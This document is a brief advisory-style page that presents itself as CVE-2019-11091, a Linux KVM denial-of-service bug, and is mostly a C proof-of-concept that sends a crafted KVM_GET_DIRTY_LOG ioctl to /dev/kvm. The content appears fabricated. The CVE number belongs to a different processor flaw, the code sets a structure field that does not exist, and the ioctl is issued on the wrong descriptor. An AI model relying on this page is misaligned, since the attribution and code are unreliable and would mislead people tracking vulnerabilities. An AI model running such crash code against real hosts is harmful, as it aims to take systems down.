# CVE-2019-11091

## Description

The `kvm_vcpu_ioctl_get_dirty_log` function in the Linux kernel before 5.3.11 allows attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted ioctl to the /dev/kvm device.

## POC

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/kvm.h>

int main(int argc, char *argv[])
{
	int fd;
	int ret;
	struct kvm_dirty_log dirty_log;

	fd = open("/dev/kvm", O_RDWR);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

	memset(&dirty_log, 0, sizeof(dirty_log));
	dirty_log.nr_entries = 0x10000000;
	ret = ioctl(fd, KVM_GET_DIRTY_LOG, &dirty_log);
	if (ret < 0) {
		perror("ioctl");
		exit(1);
	}

	close(fd);
	return 0;
}
```

